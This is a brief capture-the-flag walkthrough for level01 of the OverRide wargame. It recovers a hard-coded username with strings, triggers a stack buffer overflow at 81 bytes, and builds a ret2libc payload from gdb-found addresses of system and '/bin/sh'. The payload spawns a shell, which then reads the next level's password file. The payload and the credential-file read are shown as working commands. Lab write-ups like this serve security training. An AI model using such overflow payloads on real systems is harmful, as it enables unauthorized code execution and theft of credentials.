# By doing strings we can find the username

level01@OverRide:~$ strings level01
[...]
dat_wil
[...]

level01@OverRide:~$ ./level01
Enter Username: dat_wil
verifying username....
Enter Password:
admin
nope, incorrect password...

# The overflow occurs at 81 char

(gdb) r < <(python -c 'print "dat_wil"' ; python -c 'print "A"*80+"\xff\xff\xff\xff"')

# We took control of EIP, let's build our shellcode (ret2libc)

(gdb) find &system,+9999999,"/bin/sh"
0xf7f897ec

(gdb) info func system
0xf7e6aed0  system

level01@OverRide:~$ (python -c 'print "dat_wil"' ; python -c 'print "A"*80+"\xd0\xae\xe6\xf7"+"\xec\x97\xf8\xf7"*2' ; cat -) | ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password:
nope, incorrect password...

whoami
level02
cat /home/users/level02/.pass
PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
